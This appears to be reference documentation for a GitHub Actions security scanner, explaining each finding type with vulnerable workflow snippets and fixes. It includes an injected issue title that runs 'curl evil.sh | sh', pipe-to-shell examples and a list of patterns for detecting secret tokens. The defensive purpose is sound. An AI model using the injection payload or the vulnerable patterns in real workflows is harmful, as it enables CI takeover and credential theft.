# Finding reference

Every line `insecureactions` prints during a scan is tagged with a bracketed
finding type. This document explains, for each tag:

- **What it means** — the underlying vulnerability class.
- **Severity** — relative impact, from informational to critical.
- **Example output** — a representative log line as emitted by the scanner.
- **Vulnerable pattern** — a minimal workflow snippet that triggers it.
- **How to fix** — concrete remediation guidance.
- **References** — upstream documentation or incident reports.

The output format is always:

```
[tag] owner/repo:.github/workflows/file.yml -> <detail>
```

---

## `[script-injection]`

**Severity:** High — direct shell injection into a privileged step.

**Meaning:** A `${{ … }}` expression that references attacker-controlled
context (`github.event.issue.title`, `github.event.pull_request.body`,
`github.head_ref`, `github.event.comment.body`, commit messages, etc.) is
interpolated **directly** into a `run:` block. GitHub Actions performs the
expression substitution *before* the shell sees the command, so any quoting
inside the value is ignored — the attacker's content becomes shell syntax.

**Example output:**
```
[script-injection] org/repo:.github/workflows/ci.yml -> ${{ github.event.issue.title }}
```

**Vulnerable pattern:**
```yaml
- run: echo "Issue title: ${{ github.event.issue.title }}"
```
An attacker filing an issue titled `"; curl evil.sh | sh; #` runs arbitrary
commands.

**Fix:** Pass the value through an environment variable so the shell expands
it safely:
```yaml
- env:
    TITLE: ${{ github.event.issue.title }}
  run: echo "Issue title: $TITLE"
```

**References:**
- [GitHub Security Lab — Untrusted input in GitHub Actions](https://securitylab.github.com/research/github-actions-untrusted-input/)
- [GitHub docs — Security hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-an-intermediate-environment-variable)

---

## `[github-script-injection]`

**Severity:** High — same class as `[script-injection]`, but the sink is a
JavaScript body instead of a shell command.

**Meaning:** `actions/github-script` runs the `script:` parameter as JS with
broad GitHub API access. Interpolating `${{ github.event.* }}` into that
script lets an attacker inject JavaScript that runs with the workflow's
token.

**Example output:**
```
[github-script-injection] org/repo:.github/workflows/triage.yml -> ${{ github.event.pull_request.title }}
```

**Vulnerable pattern:**
```yaml
- uses: actions/github-script@v7
  with:
    script: |
      const title = `${{ github.event.pull_request.title }}`;
      await github.rest.issues.createComment({ body: title });
```

**Fix:** Read untrusted values from `process.env` instead of templating them:
```yaml
- uses: actions/github-script@v7
  env:
    TITLE: ${{ github.event.pull_request.title }}
  with:
    script: |
      const title = process.env.TITLE;
      await github.rest.issues.createComment({ body: title });
```

---

## `[pull_request_target+checkout-pr-ref]`

**Severity:** Critical — repository takeover and secret exfiltration.

**Meaning:** The workflow runs on the `pull_request_target` trigger (which
executes in the base-repository context with a *write-scoped* `GITHUB_TOKEN`
and access to all secrets) **and** explicitly checks out the pull request's
own ref. The combination runs attacker-supplied code in a fully privileged
environment.

Both shapes are detected:
- `ref: ${{ github.event.pull_request.head.sha | head.ref | head.label }}`
- `repository: ${{ github.event.pull_request.head.repo.full_name }}`

**Example output:**
```
[pull_request_target+checkout-pr-ref] org/repo:.github/workflows/build.yml -> attacker-controlled code may run with write token
```

**Vulnerable pattern:**
```yaml
on:
  pull_request_target:
    branches: [main]
jobs:
  build:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: ./build.sh        # ← runs attacker's build script
```

**Fix:** Use the unprivileged `pull_request` trigger for builds that need PR
code; reserve `pull_request_target` for trusted post-merge actions that
*don't* check out the PR. If you must validate a PR with elevated privileges,
gate the privileged step behind a manually-applied label that only
maintainers can add — and re-check that label inside the workflow.

**References:**
- [GitHub Security Lab — Preventing pwn requests](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)

---

## `[build-on-untrusted-checkout]`

**Severity:** Critical — supply-chain RCE class disclosed by Sysdig against
MITRE, Splunk, spotipy, and others.

**Meaning:** A privileged trigger (`pull_request_target`, `workflow_run`,
`issue_comment`) checks out attacker-controlled code, then runs an
install/build command. Many ecosystem tools execute arbitrary code from the
checked-out source during install — `pip install -r requirements.txt`
will run `setup.py`, `npm ci` runs lifecycle scripts, `./gradlew` runs the
build script, and so on.

Commands detected: `pip install`, `python setup.py`, `npm install/ci/i`,
`yarn`, `pnpm install`, `bundle install`, `gem install`, `composer install`,
`go install/get/generate/run/build/test`, `cargo install/build/run/test`,
`mvn`, `gradle`, `./gradlew`, `make`, `sbt`, `terraform init/apply/plan`.

**Example output:**
```
[build-on-untrusted-checkout] org/repo:.github/workflows/test.yml -> `pip install` runs attacker code after privileged checkout
```

**Vulnerable pattern:**
```yaml
on: pull_request_target
jobs:
  test:
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: pip install -r requirements.txt   # ← attacker's setup.py
```

**Fix:** Don't run install/build steps after a privileged checkout of
untrusted code. Move the build into a `pull_request`-triggered workflow
(no secrets), or split into two workflows: one privileged that does *not*
check out the PR, and one unprivileged that does.

**References:**
- [Sysdig — Insecure GitHub Actions found in MITRE, Splunk, and other open-source repositories](https://www.sysdig.com/blog/insecure-github-actions-found-in-mitre-splunk-and-other-open-source-repositories)

---

## `[self-hosted+fork-trigger]`

**Severity:** Critical — persistent compromise of your own infrastructure.

**Meaning:** A job runs on a self-hosted runner **and** the workflow is
triggered by an event a fork can drive (`pull_request`, `pull_request_target`,
`workflow_run`, `issue_comment`, `fork`). On public repositories, any
contributor can submit a PR whose code executes on your runner — and because
self-hosted runners are not ephemeral by default, the attacker can persist
malware between jobs, mine crypto, pivot into your network, or steal cached
credentials.

**Example output:**
```
[self-hosted+fork-trigger] org/repo:.github/workflows/ci.yml -> self-hosted runner exposed to fork-driven workflow execution
```

**Vulnerable pattern:**
```yaml
on: pull_request
jobs:
  build:
    runs-on: [self-hosted, linux, x64]
    steps:
      - uses: actions/checkout@v4
      - run: ./build.sh
```

**Fix:** Use GitHub-hosted runners for any workflow that fork PRs can
trigger. If you must use self-hosted runners, run them in single-use
ephemeral VMs (e.g. via [actions-runner-controller](https://github.com/actions/actions-runner-controller))
and require the `Require approval for all outside collaborators` setting
under repository actions permissions.

**References:**
- [GitHub docs — Self-hosted runner security](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners/about-self-hosted-runners#self-hosted-runner-security)

---

## `[no-permissions-block]`

**Severity:** Medium — broadens blast radius of any other finding.

**Meaning:** The workflow does not declare a `permissions:` block, so the
`GITHUB_TOKEN` issued to it inherits the repository or organization default.
On many older repos the default is `contents: write` (or full read/write
on everything) — any script-injection or supply-chain bug in the workflow
becomes a write-the-repo bug.

**Example output:**
```
[no-permissions-block] org/repo:.github/workflows/ci.yml -> GITHUB_TOKEN inherits repo defaults (often contents: write)
```

**Fix:** Add a top-level `permissions:` block requesting only what the
workflow needs. The safe baseline:
```yaml
permissions:
  contents: read
```

**References:**
- [GitHub docs — Permissions for the GITHUB_TOKEN](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token)

---

## `[permissions-write-all]`

**Severity:** High — explicit grant of full write to the workflow token.

**Meaning:** `permissions: write-all` is declared, granting the workflow
write access to *every* scope: contents, issues, pull requests, packages,
deployments, security events, actions, and more. Any injected command can
push commits, publish releases, dismiss security advisories, etc.

**Example output:**
```
[permissions-write-all] org/repo:.github/workflows/release.yml -> GITHUB_TOKEN granted full write scope
```

**Fix:** Replace with a narrowly-scoped declaration. For most jobs:
```yaml
permissions:
  contents: read
```
Add only the specific writes you actually need (`packages: write`,
`pull-requests: write`, etc.).

---

## `[pipe-to-shell]`

**Severity:** Medium — depends on the trust level of the remote endpoint.

**Meaning:** A `run:` block pipes the output of `curl`/`wget`/`fetch`
directly into a shell (`bash`, `sh`, `zsh`, `dash`, `ksh`). If the remote
domain, the TLS chain, or the publishing pipeline of that domain is ever
compromised, the attacker gets code execution inside your CI environment.

**Example output:**
```
[pipe-to-shell] org/repo:.github/workflows/ci.yml -> curl -fsSL https://get.example.com/install.sh | bash
```

**Vulnerable pattern:**
```yaml
- run: curl -fsSL https://get.example.com/install.sh | bash
```

**Fix:** Download the script, verify its hash against a checked-in
expectation, then execute:
```yaml
- run: |
    curl -fsSL https://get.example.com/install.sh -o install.sh
    echo "<sha256>  install.sh" | sha256sum -c
    bash install.sh
```
Or use the official Action/package for the tool when one exists.

---

## `[outdated-action]`

**Severity:** Low–Medium — varies by version.

**Meaning:** A first-party action is pinned to a major version whose Node
runtime is deprecated by GitHub, or to a major version with a known
security regression. Currently flagged:
- `actions/checkout@v1` — defaults to `persist-credentials: true` and leaks
  the token via `.git/config`.
- `actions/checkout@v2`, `@v3` — Node 12 / Node 16 runtimes, both
  end-of-life on GitHub's runner image.

**Example output:**
```
[outdated-action] org/repo:.github/workflows/ci.yml -> actions/checkout@v3
```

**Fix:** Upgrade to `actions/checkout@v4` (or pin to its commit SHA).

---

## `[compromised-action]`

**Severity:** Critical — the referenced action has been involved in a
publicly-disclosed supply-chain compromise.

**Meaning:** The workflow references an action whose owner namespace or
specific releases were tampered with by an attacker. Pinning to a SHA does
not necessarily save you — the tags themselves were rewritten to point at
malicious commits, so even SHA pins can be malicious if you adopted them
during the exposure window.

Currently in the blocklist (March 2025 incident, CVE-2025-30066):
- `tj-actions/changed-files`
- `reviewdog/action-setup`
- `reviewdog/action-shellcheck`
- `reviewdog/action-composite-template`
- `reviewdog/action-staticcheck`
- `reviewdog/action-actionlint`
- `reviewdog/action-typos`

**Example output:**
```
[compromised-action] org/repo:.github/workflows/ci.yml -> tj-actions/changed-files@v44 (Compromised Mar-2025 (CVE-2025-30066) — secrets leaked via crafted commits)
```

**Fix:** Remove the action entirely, or replace with an audited fork pinned
by SHA to a commit known to predate the compromise. **Rotate every secret
that any workflow run using this action could have read.**

**References:**
- [Wiz — tj-actions/changed-files supply-chain compromise](https://www.wiz.io/blog/github-action-tj-actions-changed-files-supply-chain-attack-cve-2025-30066)
- [StepSecurity — CVE-2025-30066 advisory](https://www.stepsecurity.io/blog/harden-runner-detection-tj-actions-changed-files-action-is-compromised)

---

## `[cve-2025-30066-malicious-pin]`

**Severity:** Critical — smoking gun.

**Meaning:** The workflow pins `tj-actions/changed-files` directly to the
malicious commit SHA (`0e58ed8671d6b60d0890c21b07f8835ace038e67`). Unlike a
tag reference (which may resolve to a non-malicious commit today), this is a
deliberate or accidentally frozen reference to the attacker's payload.

**Example output:**
```
[cve-2025-30066-malicious-pin] org/repo:.github/workflows/ci.yml -> tj-actions/changed-files@0e58ed8671d6b60d0890c21b07f8835ace038e67 (direct pin to the malicious commit; secrets in any run that executed this step are compromised)
```

**Fix:** Remove the reference immediately, then assume **every** secret
available to that workflow's runs is compromised and rotate it.

---

## `[cve-2025-30066-exposed-runs]`

**Severity:** Critical — actual exploitation evidence (the workflow
executed during the CVE's exposure window).

**Meaning:** Emitted only with `--cve-2025-30066`. For each workflow that
references `tj-actions/changed-files`, the scanner queries the Actions
runs API for executions between `2025-03-14` and `2025-03-15` UTC (the
exposure window). Each run during that window almost certainly executed
the malicious payload that base64-encoded process memory into the log.

**Example output:**
```
[cve-2025-30066-exposed-runs] org/repo:.github/workflows/ci.yml -> 3 run(s) executed during the exposure window (2025-03-14..2025-03-15); scanning logs for leaked secrets
    [confirmed] run #142 https://github.com/org/repo/actions/runs/12345 -> build/1_Get-changed-files.txt: decoded blob contains ghp_… credential
    [suspicious] run #143 https://github.com/org/repo/actions/runs/12346 -> build/1_Get-changed-files.txt: 8420-char base64 blob (6300 bytes decoded)
    run #144 https://github.com/org/repo/actions/runs/12347 -> no IoCs in logs
    summary: scanned=3 confirmed=1 suspicious=1 expired-or-unreadable=0
```

**Sub-tag — `confirmed`** (per-run): a long base64 blob in the log file
decoded to bytes containing a recognized secret prefix:
- `ghp_…`, `ghs_…`, `gho_…`, `github_pat_…` (GitHub tokens)
- `AKIA…`, `ASIA…` (AWS access keys)
- `AIza…` (Google API)
- `xoxp-…` / `xoxb-…` / `xoxa-…` / `xoxr-…` / `xoxo-…` (Slack)
- `npm_…` (npm)
- `glpat-…` (GitLab)
- `sk-…` (OpenAI and similar)

**Sub-tag — `suspicious`** (per-run): a base64 blob whose decoded content
is over 4 KB and contains no recognized prefix. Still consistent with a
runner-memory dump — investigate the log manually.

**Fix:** Rotate **every secret** referenced by any `confirmed` run. For
`suspicious` runs, open the run URL and review the log manually. Logs are
fetched into memory only and never written to disk by the scanner.

**Caveats:**
- GitHub retains workflow **logs** for 90 days by default. The CVE window
  is in March 2025 — most repositories will return `expired-or-unreadable`
  unless retention was extended.
- GitHub retains workflow-**run metadata** in the Actions API for roughly
  **14 months**. Past that horizon the runs API simply returns 0 results
  for the CVE window — *every* repo will look `[cve-2025-30066-clean]`
  whether or not it was actually affected. Verified empirically: as of
  May 2026, `netdata/netdata` returns `0` runs for any query in March 2025
  but thousands for April 2025 onward.
- This means the **dynamic audit for CVE-2025-30066 is effectively
  inert after ~May 2026**. The static detectors
  (`[compromised-action]`, `[cve-2025-30066-malicious-pin]`) are not
  time-bound and remain useful. The scanner warns at startup when this
  retention horizon has been crossed.
- The scanner caps log downloads at 20 runs per workflow to avoid
  excessive bandwidth use; any extras are reported as not scanned.

---

## `[secrets-inherit]`

**Severity:** Medium–High — depends on the trust level of the called
workflow.

**Meaning:** A reusable workflow call uses `secrets: inherit`, which hands
**every** caller secret to the called workflow. Acceptable for internal
reusables you fully control; dangerous when the callee is third-party or
when the caller has secrets the callee shouldn't see.

**Example output:**
```
[secrets-inherit] org/repo:.github/workflows/ci.yml -> reusable workflow call receives all caller secrets
```

**Vulnerable pattern:**
```yaml
jobs:
  call:
    uses: third-party/repo/.github/workflows/reusable.yml@main
    secrets: inherit
```

**Fix:** Pass only the secrets the callee actually needs, by name:
```yaml
jobs:
  call:
    uses: third-party/repo/.github/workflows/reusable.yml@<sha>
    secrets:
      NPM_TOKEN: ${{ secrets.NPM_TOKEN }}
```

---

## `[unpinned-action]`

**Severity:** Medium — the entire supply chain becomes mutable.

**Meaning:** A non-first-party action is referenced by a mutable ref (a
branch like `@main` or a tag like `@v3`) rather than a full commit SHA.
Tags and branches can be silently retargeted by the action owner (or by an
attacker who compromises their account) — your workflow then executes
different code on its next run without any change in your repository.

First-party actions (`actions/*`, `github/*`) are deliberately *not*
flagged here, since their major-version tags are maintained by GitHub.
They are still better off SHA-pinned.

**Example output:**
```
[unpinned-action] org/repo:.github/workflows/ci.yml -> some/action@v3
```

**Fix:** Pin to a full 40-character commit SHA, and leave the human-readable
version in a trailing comment:
```yaml
- uses: some/action@1234567890abcdef1234567890abcdef12345678  # v3.4.1
```

**References:**
- [GitHub docs — Using third-party actions](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-third-party-actions)

---

## `[broken-link]`

**Severity:** Low–Informational — depends on whether the host or path can
be re-registered.

**Meaning:** A URL referenced anywhere in the workflow file responds with
an HTTP error (≥ 400) or fails to connect. Emitted only with
`--check-links`. Typically benign — but a 404 on a domain that has lapsed
in registration, or a deleted GitHub user/repo path, can be claimed by an
attacker who then controls whatever the workflow fetches from that URL.

**Example output:**
```
[broken-link] org/repo:.github/workflows/ci.yml -> https://example.com/install.sh (404)
```

**Fix:** Replace the URL with a current, controlled source, or remove the
reference. For documentation links, update the target.

---

# Severity at a glance

| Severity | Tags |
|---|---|
| Critical | `[pull_request_target+checkout-pr-ref]`, `[build-on-untrusted-checkout]`, `[self-hosted+fork-trigger]`, `[compromised-action]`, `[cve-2025-30066-malicious-pin]`, `[cve-2025-30066-exposed-runs]` |
| High | `[script-injection]`, `[github-script-injection]`, `[permissions-write-all]`, `[secrets-inherit]` |
| Medium | `[no-permissions-block]`, `[pipe-to-shell]`, `[unpinned-action]` |
| Low–Informational | `[outdated-action]`, `[broken-link]` |
